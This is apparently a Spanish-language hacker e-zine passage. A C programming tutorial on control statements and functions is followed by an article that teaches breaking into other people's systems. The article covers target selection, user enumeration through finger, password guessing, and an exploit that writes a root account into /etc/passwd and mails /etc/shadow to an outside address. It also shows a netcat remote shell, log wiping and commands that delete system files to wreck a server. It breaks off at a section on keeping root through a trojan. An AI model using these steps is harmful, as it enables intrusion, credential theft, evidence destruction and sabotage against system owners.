 La sentencia  break  puede tambien usarse  para terminar una  sentencia for
 infinita:

 for (;;) {
         if  (expresion)
         break; 
 }


 i.- Sentencia continue
     ------------------

 Obliga a un bucle a iniciar su proxima iteracion al principio del bucle.

 Ejemplo:


#include <stdio.h>
main()
{
   int contador;

   printf("\n Empezando el bucle for que contiene continue...\n");
   for (contador = 1; contador <= 10; contador++) {
     if (contador > 5) continue;
     printf("%d\n", contador);
   }
   printf("Despues del bucle for, contador = %d\n", contador);

   printf("\n\nEmpezando el bucle for que contiene break...\n");
   for (contador = 1; contador <= 10; contador++) {
     if (contador > 5) break;
     printf("%d\n", contador);
   } 
   printf("Despues del bucle for, contador = %d\n", contador);
  return 0;
}


 j.- Sentencia goto
     --------------

 Se usa asociada a una etiqueta constituida por un identificador  seguido  de
 ":". Cuando se ejecuta el programa, esta provoca un salto a la sentencia que
 sigue inmediatamente a la etiqueta.

 Resulta  dificil  depurar un programa que utilice un exceso de gotos. Ademas
 de  esto, el  compilador  tiene  problemas  para  optimizar  los  gotos.  Se
 recomienda, en consecuencia, limitarse en su uso o no usarla.

 Ejemplo:


#include <stdio.h>

main()
{
   int contador = 1;

 TOP:
   printf("%d\n", contador);
   contador++;
   if (contador <= 10) goto TOP;
   return 0;
}



 k.- exit()
     ------

 Normalmente la ejecucion de un programa se termina despues de ejecutarse la
 ultima sentencia que se encuentra en main(). Generalmente esta sentencia es:

 return valor;

 Otra  manera  de  terminar la ejecucion es llamando  a  la  funcion  exit(),
 definida en stdlib.h

Ejemplo:


#include <stdio.h>
#include <stdlib.h>
#include <ctype.h>
main()
{
   char respuesta;
  
   printf("\nTeclear S para Si, N para No: ");
   respuesta = toupper(getchar());
   if (respuesta == 'Y')
     exit(1);
   else
     exit(0);
   printf("esta sentencia no se ejecuta nunca!\n");
}



 Este  programa puede usarse en cualquier archivo batch que necesite de  una 
 respuesta si/no del usuario. Por ejemplo, crear el archivo batch prueba.bat
 para probarlo

 prueba.bat
 echo off
 goto PRINCIPIO
 :SI
 echo Contesta si !
 :PRINCIPIO
 echo.
 echo Quiere seguir?

 Ejm 2:

 if errorlevel == 1 goto SI
 echo Contesta no !



 III.- Funciones
       ---------

 Un programa C esta constituido por una funcion main() y otras  funciones mas
 cuya tarea es muy especifica. Generalmente, se  asigna  a  cada funcion  una
 tarea muy bien definida. Al escribir  las  funciones  se recomienda la mayor
 simplicidad.

 1.- Funciones que no devuelven  valores
     -----------------------------------

 El ejemplo  siguiente  muestra  la  manera  correcta  de escribir y usar las
 funciones.

 Ejemplo:

 1       #include <stdio.h>
 2
 3       void Cuenta(void);
 4       void CuentaAlReves(void);
 5
 6       main()
 7       {
 8         Cuenta();
 9         CuentaAlReves();
 10        return 0;
 11      }
 12
 13      void Cuenta(void)
 14      {
 15        int i;
 16
 17        printf("\n\nContando hasta 10\n");
 18        for (i = 1; i <= 10; i++)
 19          printf("%4d", i);
 20      }
 21
 22      void CuentaAlReves(void)
 23      {
 24        int i;
 25
 26        printf("\n\nContando al reves desde 10\n");
 27        for (i = 10; i >= 1; i--)
 28          printf("%4d", i);
 29      }

 Las lineas 3 - 4 declaran los prototipos de las funciones, o sea, el esquema
 que  indica al compilador el nombre y la forma de cada funcion del programa.
 Por ejemplo, en la linea 3 cuenta  es el nombre de la funcion. Puesto que la
 funcion no devuelve un valor, se usa antes del nombre la palabra void. Ademas
 dentro  de  los  parentesis tambien se coloca void para indicar al compilador
 que la funcion no requiere de parametros. Cuenta es la forma mas sencilla de
 funcion: no devuelve nada y no necesita parametros de entrada.

 La  linea  8  llama  a  la  funcion. Con esta simple sentencia se ejecuta la
 funcion.

 En  alguna parte del programa, despues de la declaracion de la funcion, pero
 no dentro de otra funcion, debe definirse la funcion. Para eso, se coloca el
 encabezado rigurosamente identico a la declaracion de la funcion pero sin el
 ";" ,  y  a  continuacion  el  bloque  de  definicion   que  puede  contener
 declaraciones de variables.

 Cualquier variable declarada dentro de una funcion es local a la funcion. Su
 tiempo de vida es igual al tiempo de actividad de la funcion.

 En  el  ejemplo, las  variables  i  definidas  en las lineas 15 y 24 son dos
 variables diferentes.


 2.- Funciones que devuelven un valor
     --------------------------------

 En  el  ejemplo anterior se utiliza una funcion que devuelve un valor entero
 para  indicar la respuesta del usuario cuando se le pregunta si quiere salir
 de la aplicacion. Esta funcion se declara como una funcion  que  devuelve un
 valor entero y no requiere argumentos.


#include <stdio.h>
#include <ctype.h>
#define FALSO 0
#define CIERTO 1

int Saliendo(void);

main()
{
  int i = 0;
  int salir = FALSO;

  printf("Salir\n");
  while (!salir) 
  {
   i++;
   printf("i == %d\n", i);
   salir = Saliendo();
  }
   return 0;
}

int Saliendo(void)
{
  int c;

  printf("Otro valor? (s/n) ");
  do 
  {
   c = toupper(getchar());
  } while ((c != 'S') && (c != 'N'));
   return (c == 'N');
}



 El ejemplo anterior usa una funcion que devuelve un valor real. Este ejemplo
 muestra ademas como colocar las directivas #include y #define  en un archivo
 de cabecera unidades.h. Todas estas declaraciones podrian  haberse  colocado
 al principio del  programa, sin  embargo, al colocarse en un archivo aparte,
 pueden utilizarse en cualquier otro programa.



 Unidades.h
 #include <conio.h>

 #define FALSO 0
 #define CIERTO 1
 #define CENT_POR_PULG 2.54;

 /* Prototipos de Funciones */

 void MuestraMenu(void);
 int SelecMenu(void);
 double PideValor(void);
 void PulgadasACentimetros(void);

 Ejemplo:

 1       #include <stdio.h>
 2       #include "c:\conversi.h"
 3
 4       main()
 5       {
 6         int saliendo = FALSO;
 7
 8         printf("Bienvenido al Programa de Conversion de Unidades\n");
 9         while (!saliendo) {
 10          MuestraMenu();
 11          switch(SelecMenu()) {
 12            case 1:
 13              PulgadasACentimetros();
 14              break;
 15            case 9:
 16              saliendo = CIERTO;
 17              break;
 18            default:
 19              printf("\nError en la Seleccion!\a\n");
 20          }
 21        }
 22        return 0;
 23      }
 24
 25      /* Definicion de las funciones */
 26
 27      void MuestraMenu(void)
 28      {
 29        printf("\nMenu\n");
 30        printf("----\n");
 31        printf("1 -- Pulgadas a centimetros\n");
 32        printf("2 -- Centimetros a pulgadas\n");
 33        printf("3 -- Pies a metros\n");
 34        printf("4 -- Metros a pies\n");
 35        printf("5 -- Millas a kilometros\n");
 36        printf("6 -- Kilometros a millas\n");
 37        printf("9 -- Salir\n");
 38      }
 39
 40      int SelecMenu(void)
 41      {
 42        printf("\nSeleccion? (No presione ENTER!): ");
 43        return (getche() - '0');
 44      }
 45
 46      double PideValor(void)
 47      {
 48        double valor;
 49
 50        printf("\nIndique el valor que desea convertir? ");
 51        scanf("%lf", &valor);
 52        return valor;
 53      }
 54
 54      void PulgadasACentimetros(void)
 55      {
 56        double valor;
 57        double resultado;
 58
 59        printf("\nPulgadas a Centimetros\n");
 60        valor = PideValor();
 61        resultado = valor * CENT_POR_PULG;
 62        printf("%.3f pulgadas == %.3f centimetros\n", valor, resultado);
 63      }
 

 La linea 43 llama a la funcion getche() que capta la presion  de  una  tecla
 sin necesidad de presionar Enter por parte del usuario. Sustrayendo el valor
 ASCII del caracter 0 convierte el caracter a su valor decimal entre 0 y 9.

 El  valor  devuelto  por  una funcion puede tener cualquiera  de  los  tipos
 definidos anteriormente.

 3.- Errores mas comunes cometidas con las funciones
     -----------------------------------------------

 * Ausencia de return: si la funcion no esta declarada con void y no posee un
                       return en su definicion, el compilador avisa del error.
 * Falta de un return: este error es comun cuando se usa la sentencia if.
 * Ausencia de prototipo: en este caso se considera que  la  funcion devuelve
                          un  valor  entero; sin  embargo, es  preferible  no
                          contar con esta regla.
 * efectos laterales: el caso mas frecuente es cuando la funcion modifica el
                      valor de una o varias variables globales.

 El  tercer tipo  de error  es comun  en  los  programas  viejos. main(), por
 ejemplo, devuelve  un  valor  entero  y  podria  declararse  int  main(). En
 realidad  es por  eso que  se  ha se~alado  anteriormente que main() deberia
 siempre contener una sentencia return.

 El  ejemplo  Anterior  ilustra  el cuarto  error que probablemente es el mas
 dificil de detectar.


 #include <stdio.h>

 int Par(void);
 int Impar(void);
  
 int i = 1;

 main()
 {
   while (i < 20) {
     printf("%2d", i);
     if (Par())
       printf(" : is par");
     printf("\n");
     i++;
   }
   return 0;
 }

 int Par(void)
 {
   i++;
   return Impar();
 }

 int Impar(void)
 {
   return (i % 2);
 }



 4.- Variables Locales
     -----------------

 Las  variables  declaradas  dentro  de  las  funciones  son  locales a estas
 funciones. Esto significa que no existen afuera de ellas.

 Cuando  se  llama  a  una  funcion, esta  reserva  espacio  en  la pila para
 almacenar  sus  variables  locales. Cuando  se  termina  la  ejecucion de la
 funcion, esta  borra  el espacio de la pila que se ha reservado, borrando al
 mismo tiempo cualquier valor almacenado.

 Si dos funciones independientes  declaran una variable  local, mientras  una
 funcion no llame a la otra, las  dos variables pueden muy bien usar el mismo
 espacio  de memoria, claro, no  al  mismo  tiempo. Se  asegura  asi  un  uso
 racional de la memoria.

 El siguiente ejemplo ilustra estos conceptos. Aun cuando las  dos  funciones
 utilizan  el mismo nombre de variable  no  se  produce  ningun conflicto. La
 funcion1 llama a la funcion2 pero esta ultima  no  cambia el contenido de la
 variable de la funcion1 ya que para la funcion2  la variable declarada en la
 funcion1 no existe.

 1       #include <stdio.h>
 2       #include <conio.h>
 3
 4       void Pause(void);
 5       void Funcion1(void);
 6       void Funcion2(void);
 7
 8       main()
 9       {
 10        Funcion1();
 11        return 0;
 12      }
 13
 14      void Pause(void)
 15      {
 16        printf("Presionar la <barra espaciadora> para continuar...");
 17        while (getch() != ' ') ;
 18      }
 19
 20      void Funcion1(void)
 21      {
 22        char s[15] = "Puerto La Cruz\n";
 23
 24        printf("\nLa funcion # 1 empieza.   s = %s", s);
 25        Pause();
 26        Funcion2();
 27        printf("\nDe regreso a la funcion #1. s = %s", s);
 28      }
 29
 30      void Funcion2(void)
 31      {
 32        char s[15] = "Valencia\n";
 33
 33        printf("\nLa funcion # 2 empieza.   s = %s", s);
 34        Pause();
 35      }
 

 La funcion getch() de la linea 17  es  muy  parecida  a la  funcion getche()
 utilizada en otro ejemplo, pero no muestra la respuesta del  usuario  en  la
 pantalla.


 Variable registro
 -----------------
 Las  variables register se almacenan directamente en un registro del CPU. Ya
 que no es  obligatorio  que  un  registro este disponible, se sugiere que la
 variable se almacene en un registro. Esto se hace para aumentar la velocidad
 de  las  operaciones. Estas variables son ideales para el control de bucles.
 Solo  las  variables  locales  pueden  declararse  con  register. Nunca  una
 variable global puede ser especificada como register.

 Variable Volatil
 ----------------
 Puede  usarse  el modificador volatile en la declaracion de la variable para
 se~alar que la  variable  no  puede  almacenarse  en un registro del CPU. Se
 indica tambien al compilador que se abstenga de proceder a cualquier tipo de
 optimizacion al manipular esta variable.

 Tipicamente, se utilizan estas variables cuando se usan  valores  que  deben
 ser modificados por una rutina de interrupcion que  opera independientemente
 del programa.

 Variable Externa
 ----------------
 Al  declarar  una  variable se describe su tipo. Al definirla, se reserva un
 espacio  para almacenar  su  valor. Un  programa puede  declarar  un  numero
 ilimitado de veces una variable, pero solo puede definirla una vez.

 Cuando un programa esta constituido por varios archivos, las funciones de un
 modulo pueden hacer referencia a las variables definidas en otro modulo. Las
 variables  definidas  en  un  modulo  diferente  de  donde se usan se llaman
 externas. Por ejemplo, si se define en el modulo A una variable:

 int afuera;

 y  si  una  funcion  de  un  modulo  B  necesita  usar esta variable, debera
 declararse en B:

 extern int afuera;

 El ejemplo siguiente contiene dos archivos, EXTERNA1.C  y  EXTERNA2.C. Antes
 de compilarlos, se crea un proyecto EXTERNA1.PRJ, se agrega los dos archivos
 y se compila y ejecuta con Ctrl + F9.


#include <stdio.h>

void GetFloat(void);
float f;

main()
{
  GetFloat();
  printf("Valor del numero real = %f\n", f);
  return 0;
}


#include <stdio.h>

void GetFloat(void)
{
  extern float f;
  printf("Teclear un numero real: ");
  scanf("%f", &f);
}



 Variable Estatica
 -----------------
 Como ya se ha mencionado, las variables locales no mantienen su valor entre
 dos  llamadas  a  la  funcion. Sin embargo, a veces, es  necesario  definir
 variables que mantienen su valor entre dos llamadas a las funciones. En este
 caso se declaran como static.

 Ejemplo:

#include <stdio.h>

 int Proximo1(void);
 int Proximo2(void);

 main()
 {
   int i;

   printf("\nLlamando a Proximo1():\n");
   for (i = 1; i <= 10; i++)
     printf(" %d", Proximo1());
   printf("\nLlamando a Proximo2():\n");
   for (i = 1; i <= 10; i++)
     printf(" %d", Proximo2());
   return 0;
 }

 int Proximo1(void)
 {
   static int valor = 1;

   return valor++;
 }

 int Proximo2(void)
 {
   int valor = 1;

   return valor++;
}



 5.- Parametros y Argumentos
     -----------------------

 double cubo(double r);       /* r es un parametro. */
 x = cubo(y);                 /* y es un argumento  */

 double cubo(double r)
 {
    return r * r * r;
 }

 Los parametros se inicializan con el valor de los argumentos que se pasan a
 la funcion. Estos parametros reciben una copia de los valores  pasados como
 argumentos  y  el  valor  de estos ultimos no se cambia. Es  decir  que  la
 sentencia:

 Q = Costo(x,y,z)

 garantiza no cambiar los valores de x, y, z

 Ejemplo:

 #include <stdio.h>
 #include <ctype.h>
 #include <conio.h>

 #define MAXLIN 12
 #define MAXCOL 8

 void Inicializa(void);
 double Costo(double tiempo, double potencia, double costoUnitario);
 void ImprimaTabla(void);
 int Terminado(void);
 double iniciaHoras;
 double incrementoHorario;
 double iniciaWatts;
 double incrementoWatts;
 double costoPorKwh;

 main()
 {
   do {
     Inicializa();
     ImprimaTabla();
   } while (!Terminado());
   return 0;
 }

 void Inicializa(void)
 {
   puts("Costo del consumo electrico\n");
   printf("Numero Inicial de Horas .. ? ");
     scanf("%lf", &iniciaHoras);
   printf("Incremento Horario.......... ? ");
     scanf("%lf", &incrementoHorario);
   printf("Numero inicial de Watts .. ? ");
     scanf("%lf", &iniciaWatts);
   printf("incremento para Watts........... ? ");
     scanf("%lf", &incrementoWatts);
   printf("Costo del kilowatt hora (KWH)? ");
     scanf("%lf", &costoPorKwh);
 }

 double Costo(double tiempo, double potencia, double costoUnitario)
 {
   return costoUnitario * (potencia*0.001  * tiempo);
 }

 void ImprimaTabla(void)
 {
   int linea, col;
   double horas, watts;

   printf("\nHrs/Watts");
   watts = iniciaWatts;
   for (col = 1; col <= MAXCOL; col++) {
     printf("%8.0f", watts);
     watts += incrementoWatts;
   }
 
   horas = iniciaHoras;
   for (linea = 1; linea <= MAXLIN; linea++) {
     printf("\n%6.1f - ", horas);
     watts = iniciaWatts;
     for (col = 1; col <= MAXCOL; col++) {
       printf("%8.2f", Costo(horas, watts, costoPorKwh));
       watts += incrementoWatts;
     }
     horas += incrementoHorario;
   }
   printf("\n\nCosto del consumo electrico @ Bs.%.4f por KWH\n", costoPorKwh);
 }

 int Terminado(void)
 {
   int respuesta;

   printf("\nOtra tabla (s/n) ? ");
   respuesta = getch();
   putchar(respuesta);
   putchar('\n');
   return (toupper(respuesta) != 'S');
 }


 En este ejemplo, la funcion putchar() se usa para mostrar un solo caracter.

 El prototipo de una funcion puede omitir los nombres de los parametros:

 double Costo (double, double, double);

 Sin embargo, la  definicion  de  la funcion debe incluir los nombres  de los
 parametros:

 double Costo(double tiempo, double potencia, double costoUnitario)
 {
         return costoUnitario* (potencia * 0.001 * tiempo);
 }

 Puesto que los parametros se tratan como variables locales preinicializadas,
 estos pueden declararse con los modificadores register, volatile y const.



 6.- Recursividad
     ------------

 Cuando una funcion se llama a si mismo, se habla de una funcion recursiva:

 double Factorial (int numero)
 { 
	if (numero > 1)
		return numero * Factorial(numero - 1);
	return 1;
 }


 Ejemplo:


#include <stdio.h>

 void Recuenta(int max);

 main()
 {
   Recuenta(10);
   return 0;
 }

 void Recuenta(int max)
 {
   if (max > 1)
     Recuenta(max - 1);
   printf("%4d", max);
}


 Un caso menos comun de recursividad es cuando una funcion llama a otra que a
 su vez llama a la primera funcion.

 Ejemplo:

 #include <stdio.h>

 void A(int c);
 void B(int c);

 main()
 {
   A('Z');
   puts("");
   return 0;
 }

 void A(int c)
 {
   if (c > 'A')
     B(c);
   putchar(c);
 }

 void B(int c)
 {
   A(--c);
 }


 Es importante resaltar que, a cada llamada de la funcion,  los parametros se
 almacenan en la pila, es decir que la recursividad consume el espacio  de la
 pila y podria hasta gotarlo.

 Tambien  las  llamadas  a  una funcion consumen tiempo. Un programa  que no
 utiliza funciones  recursivas  puede  ejecutarse  mas  rapidamente  que  un
 programa equivalente utilizando funciones recursivas.



 7.- Modificadores de Funcion
     ------------------------

 Por defecto, una funcion es externa. Para limitar el uso  de  la funcion  al
 modulo  donde  se  define, debe  declararse  como static. Pueden  utilizarse
 tambien los modificadores siguientes:

 pascal

 Con este modificador las funciones son responsables de eliminar de la pila
 los valores de los argumentos alli colocados por la llamada a la funcion.

 _fastcall
 ---------
 Pasa los argumentos en registros en vez de la pila.

 interrupt
 ---------
 Declara a una funcion como rutina de interrupcion.

 near
 ----
 La funcion puede llamarse solamente a partir del mismo segmento de memoria.

 far
 ---
 La funcion puede llamarse a partir de cualquier segemento de memoria.

 huge
 ----
 Lo mismo que far.


 8.- Compilacion condicional
     -----------------------
 Se utilisa #ifdef para chequear si una constante simbolica existe:

 # ifdef DEPURANDO
         sentencia1;
 # elif  PRUEBABETA
         sentencia2;
 # else 
         sentencia3;
 #endif
 #ifndef BUFFER
         #define BUFFER 255
 #endif

 para evitar incluir varias veces el mismo archivo de cabecera:

 #if !defined(___DEFS_H)
 #include <_defs.h>
 #endif




-[ 2x09 ]--------------------------------------------------------------------
-[ Metodos de PENEtracion de sistemas ]----------------------------[ Sonyy ]-
----------------------------------------------------[ sonico60@hotmail.com ]-

  Indice General
  --------------

  01.- Introduccion.
  02.- Selecionando el objetivo.
  03.- Determinar que sistema operativo es...
  04.- Escaneando a la Victima.
  05.- Sacando informacion de los puertos abiertos
       y tratar de penetar el sistema.
  06.- Exploits locales y ejemplos.
  07.- Exploits remotos y ejemplos.
  08.- Borrado de huellas.
  09.- Como mantener el root con un Troyano.
  10.- Ataques del tipo D.o.S.
  11.- Descubriendo exploits locales en nuestro sistema.
  12.- Anexos:
   A.- Mis Log's de como entre a varios lugares.
   B.- Como entre a www.venezuela.gov.ve
  13.- Despedida.




  01.- Introduccion
       ------------

  His ;-)
  Bueno me presento soy Sonyy de Argentina Bs As.
  Soy del team ackWT (jejeje lindo chivo no??)

  Bueno este  texto se basa en todo lo que ronda en mi cerebro, asi que si
  escribo alguna pelotudes haganmelo saber ;-)


  02.- Selecionando el objetivo
       ------------------------
  
  Para buscar host www.netcraft.com ;-) por ejemplo:

  *.gov.ar
  *.nasa.gov
  *.edu
  *.com 
  etc...

  Recomendacion: Cuando  nos  dirigimos  a  un  objetivo  en  concreto, es
  conveniento anotar toda la info que se saque del host en un archivo, eso
  es muy util.

  Bueno  como  principal, para seleccionar  un objetivo, tenemos que tener
  en cuenta varias cosas:

  Tenemos alguna shell para hacer login a la victima?.

  Por que no lo vamos a hacer desde nuestra maquina sin  tener  una  o dos
  shells , para que no salte nuestra ip.

  Luego otro punto es saber de que es la web: Porno (En mi opinion hay que
  hacerlas  mierda) , Alguna  compa~ia , algun  site  del gobierno, alguna
  universidad, bueno hay que ver con quien nos metemos no les parece?.


  03.-  Determinar que sistema operativo es...
        --------------------------------------

  Despues  de  tener  en  cuenta  estas  cosas hay que fijarse que sistema
  operativo usa, para saber con que atacar, por que no es igual un win que
  un linux, o me equivoco?.

  Para saber el sistema operativo hay varias maneras:

  Una es hacer  telnet  a la victima en el puerto 23 , si el admin  es muy
  lamer  va  a  decir el verdadero sistema operativo, pero esto no  es  de
  confiar  por que  hay admins  que  tienen  un  dedo  de  frente  y ponen
  informacion  falsa, pero  igual  ya  la opcion de usar telnet en  vez de
  ssh me parece muy boludo, pero bueno cada loco con su tema.

  Otra forma es la de usar el Queso ;-) un programa de gran utilidad, o si
  no ir a www.netcraft.com y ahi fijarse el sistema operativo.

  Tambien  hay  otra  forma que es la de sacar el sistema operativo por el
  lpd, es  una  forma  muy  buena, esta  forma  la  podemos  encontrar  en
  http://packetstorm.securify.com (Muy pero muy buen  site, muy  completo)
  asi   se  llama  el  texto  osdetect-lpd.txt , leanlo  por  que  es  muy
  interesante.


  04.- Escaneando a la Victima
       -----------------------

  Luego de saber  que  sistema operativo es hay que saber que daemons usa,
  como  hacemos  esto,  con  nuestro  gran amigo de aventuras NMAP, que lo
  bajamos de www.insecure.org/nmap, entonces que  hacemos  escaneamos  los
  puertos para saber cual tiene abierto.

  Tambien otra  cosa que es importante es sacar los ns, por  ejemplo  esto
  es  muy  util para saber si el ftp, pop , www estan en una misma maquina
  todos o son varias , esto no va a ayudar a tener una idea del host.

  Como hacemos para sacar el ns, de la siguiente manera:

  #nslookup victima.com

  con esto nos va a salir el ns por ejemplo:

  ns1.soyunns.com

  Si  les  interesa  un poco mas este tema de sacar los ns y toda esa bola
  hay    un   muy   buen   texto   Analisis   remoto   de   sistemas   por
  honoriak <honoriak@mail.ru> busquenlo ;-)



  05.- Sacando informacion de los puertos abiertos y tratar de penetar el
       sistema.

  Luego de tenes los puertos que estan abiertos hacemos lo siguiente desde
  nuestra shell, telnet host puerto lo que vamos a hacer es conectarnos  a
  todos los puertos que esten abiertos y sacar todas las versiones de  los
  daemons.

  Por ejemplo:

  telnet victima.com 21
  telnet victima.com 25
  telnet victima.com 79
  telnet victima.com 110
  telnet victima.com 109
  telnet victima.com 143
  telnet victima.com 119

  etc...

  Luego  de  ya  tener  toda  esa  info ya tenemos una idea de que sistema
  operativo  es ,  de  los  ns, de los puertos, ahora que hacemos ??? ahhh
  jejeje veamos que utilidad le podemos sacar a cada puerto.

  Puerto 21 (Ftp) luego de sacar la version, ponemos ftp host luego cuando
  nos aparezca el login ponemos ftp guest, anonymous  guest@mishuevos.com,
  guest  anonymous , lo que hacemos es probar si se permite  la  cuenta de
  anonymous, si  es  asi  y  entramos ponemos ls -a para que nos liste los
  dir,  entonces  miramos  los  permisos de cada dir, si hay  permisos  de
  escritura  anotamos en  que dir, y nos vamos a http://www.hack.co.za o a
  http://packetstorm.securify.com y nos fijamos que exploit hay  para  esa
  version.

  Puerto 79 (El puerto del finger), el admin que tenga este puerto abierto
  es  un  verdadero lamah, por que este puerto lo que nos brinda  son  los
  usuarios  de la maquina y la info de cada usuario, para aprovecharnos de
  este puerto hacemos lo siguiente, primero nos conectamos telnet host 79.

  Y ponemos /w este  comando lo que hace es decirnos quien esta conectado,
  si el root esta  conectado no es conveniente meternos hasta que se vaya,
  pero lo que hacemos  es  fijarnos de que host viene el root, si nos dice
  console es que esta conectado directamente desde la maquina, pero si nos
  dice un host,  es  conveniente  examinar  ese  host  desde  donde  viene
  conectado  el  root, por que si uno llega a entrar a ese host y  saca el
  root de  ese host podemos sacar el pass del root del host donde nosotros
  queriamos entrar, poniendo un sniffer ;-)

  Bueno  si  dice  que no hay nadie conectado lo que tenemos que hacer  es
  probar   de   poner  nombres  de  usuarios  por  ejemplo:  juan ,  jose,
  mfernandez, etc... todo  lo  que  se  nos  ocurra, si no sacamos ninguno
  hacemos  lo siguiente entramos a la web de ese host y nos fijamos si nos
  dice algun  mail por ejemplo carlos@host.com , si encontramos un mail ya
  tenemos un user  para  probar en  el finger, entonces  lo que hacemos es
  telnet host finger y luego escribimos carlos + enter  y  nos fijamos que
  info  sale  si nos sale la info del usuario , juntamos toda la  info que
  saquemos de los usuarios y la anotamos por ejemplo:

  Trying 200.0.0.0
  Connected to host.
  Escape character is '^]'.
  ventas

  Welcome to Linux version 2.2.7 at host !

  9:10am  up 1 day, 23:56,  2 users,  load average: 0.03, 0.02, 0.00

  Login: carlos                   Name: Carlos Gimenez
  Directory: /home/ventas                 Shell: /bin/bash
  On since Sat Mar  3 09:00 (VET) on ttyp1 from nasa.gov.jejejej
  New mail received Fri Mar  2 06:58 2001 (VET)
  Unread since Wed Nov 22 13:16 2000 (VET)
  No Plan.
  Connection closed by foreign host.


  user: carlos
  datos: Carlos gimenez

  Esta info  nos sirve para sacar una shell por ejemplo hay muchos server,
  generalmente  universidades,  que  tienen  muchos usuarios y siempre hay
  alguno   que   usa   claves   faciles, entonces   lo   que   hacemos  es
  telnet victima.com 23  y  cuando  nos  salga el login probamos todas las
  posibilidades como por ejemplo:

  user: carlos
  pass: carlos

  user: carlos
  pass: gimenez

  user: carlos
  pass: cgimenez

  Bueno probamos todas las posibilidades imaginables, si logramos   entrar
  bien y sino no hay que desesperarse por que de ultimo recurso  se  puede
  concurrir  a  la fuerza bruta, que es probar con un programa usuarios  y
  claves  con  una  lista de palabras, pero si ya tenemos  el  usuario  ya
  tenemos l  mitad del trabajo hecho por que solo nos falta sacar la clave
  jejeje peque~o detalle.

  Puerto 110 es el puerto del pop para explotar alguna vulnerabilidad casi
  siempre hay que tener una shell si la tenemos , lo que tenemos que hacer
  es bajarnos el exploit y usarlo y nada mas.

  Bueno... y  asi hay que hacer sucesivamente con todos los puertos, y hay
  que  probar  todos  los  exploit, si  no  lo lograron nos quedan todavia
  opciones no se preocupen.

  Se  puede  escanear  los cgi, hay muchos programas para escanear cgi, de
  nuevo   vamos   a  packetstorm   y   escaneamos   todos   los   posibles
  cgi  si encontramos  alguno lo que tenemos que hacer es fijarnos que cgi
  es y ir  a www.hack.co.za o a http://packetstorm.securify.com y fijarnos
  como se explota, un ejemplo:

  http://host/cgi-bin/nph-test?*
  http://host/cgi-bin/nph-test?/home/*

  lo que hace esto es listar directorios.

  Si  hicimos  todo  esto  y  nada funciona no  nos  desesperemos, por que
  todavia  nos  queda  una  posibilidad pero  ya es muy dificil  pero  muy
  divertida, esta   posibilidad   es   buscar   nuestros   exploits,   mas
  adelante   voy   a   explicar  como  buscar  exploit  locales,   exploit
  remotos estoy aprendiendo jejeje ;-)
  

  Ahora digamos que entramos al sistema entonces que hacemos ??? pues  que
  mas, Sacar el root!, entonces vamos a empezar a trabajar.

  Como primer paso ponemos w para saber quien esta en el  sistema, si  esta
  el root nos conviene salir y entrar mas tarde. Si no esta el root hay que
  sacar el root, entonces hacemos esto:

  #uname -a

  Que   nos   va   a   decir  el  verdadero  S.O,  luego  de  tener   esto
  buscamos los exploits para esas versiones y listo ;-)



  06.- Exploits locales
       ----------------

  Una vez  dentro  de  la  maquina  y  sabiendo  que sistema operativos es
  buscamos el exploit remoto una vez que lo tenemos lo tenemos  que  meter
  en la maquina de la siguiente manera:

  #tee cal.sh

  luego de hacer eso ponemos:

  #sh cal.sh

  para ejecutar el exploit:

  137$ sh cal.sh
  Host [local] :local
  Type a command  (max length=75),  for example   :
  "echo r00t::0:0:Leshka Zakharoff:/:>>/etc/passwd"
  "mail leshka@leshka.chuvashia.su</etc/shadow"
  <------------------75--------------------------->
  >echo r00t::0:0:Leshka Zakharoff:/:>>/etc/passwd

  138$ su r00t

  # id

  uid=0(root) gid=0(root) groups=0(root)

  ven que facil ;-)

  Esto  conviene  probarlo en la maquina de uno y practicar, tambien   hay   
  que  fijarse bien el codigo del exploit para ver como funciona   y  para
  que  programa  es dirigido para ver si ese programa se encuentra  en  el
  sistema.


  Vamos a poner  otro ejemplo pero ahora con un codigo en c el exploit  es
  para  el  vixie-crontab-3.0.1 y funciona en  RedHat Linux 4.x/5.x/6.0  y
  en S.u.S.E. Linux 6.x, entonces que hacemos:

  #tee archivo.c
  #gcc -O2 archivo.c -o archivo

  luego ./archivo
  crontab ./CrOn

  luego esperamos un minuto y ponemos crontab -r

  luego  de  hacer  esto  si  todo  fue  bien ya tenemos una shell de root
  creada, lo que tenemos que hacer es su -l cronexpl y poner el  pass  que
  nos dice en el exploit y listo.

  facil no???



  07.- Exploits remotos
       ----------------


  Estos quizas les paresca mas dificil de usar por que hay que jugar mucho
  con el offset a veces.

  Vamos  a  dar  un  ejemplo de un exploit para el SCO para el httpd desde
  nuestra shell subimos el exploit lo compilamos y ponemos lo siguiente:

  sonyy:~ # (./s 0;cat) | netcat host 457

  id uid=28(nouser) gid=28(nogroup) groups=28(nogroup)     

  y listo nos dio una shell nobody ;-)

  No  todos  son tan faciles , este que puse es el mas facil de todos, hay
  otros  que  hay que jugar mucho con el offset y quizas este parcheado el
  bug y no funciona.



  08.- Borrar huellas
       --------------


  Bueno  esta  es  una parte muy importante, de todo por que sin ella  nos
  pueden agarrar, hay que tener en cuenta que si crackear un site  lo  mas
  facil es borrar los logs con el comando "rm" por ejemplo: 

  #rm /var/log/wtmp
  #rm /var/log/lastlog
  etc...

  y luego para no dejar mal el sistema

  #tee /var/log/wtmp
  #tee /var/log/lastlog

  pero  si  queremos  conservar  el  root  sin  que nos agarren hacemos lo
  siguiente, tenemos  que  usar zap, que son programas para borrar huellas
  editando los logs, esos programas los encontramos en packetstorm.

  Tambien  hay que borrar o editar el .bash_history o .sh_history para que
  no vean lo  que hiciste, despues tenemos tambien que borrar los exploits
  que subimos.

  Y listo el crimen perfecto, y si es una pagina porno o algun gov o algun
  host que quieran crackear hay que buscar el index.html entonces usamos el
  comando find.

  Ahora  digamos  que  este  site  es  un  site de pornografia infantil, y
  nosotros pensamos que eso esta mal (por lo menos yo si) asi que queremos
  crackearlo  y  hacer  mier..(da) jejej el  sistema, eso  es  muy  facil:
  podemos  hacer  todas  estas cosas, para que el sistema siga funcionando
  pero para que no puedan logearse ni arreglar el sistema asi que la unica
  forma de arreglarlo de reinstalando el sistema.

  #rm /etc/passwd
  #rm /etc/shadow
  #rm /bin/login
  #rm /bin/rm
  #rm /etc/inetd.conf

  y por ultimo:

  #killall login

  ;-) y  listo , no  mas nos falta cerrar los daemons menos el httpd  para
  que se vea el crack.


  09.- Como mantener el root con un Troyano
       ------------------------------------

  Bueno  digamos que no queremos crackear este sistema , asi  que  lo  que
  queremos  hacer es  tener  root  siempre, sin que nos agarren, sin poner
  nombre de usuario sin  poner  clave, sin que nadie en el sistema  se  de
  cuenta que hay alguien en el sistema poniendo el comando who lindo no?

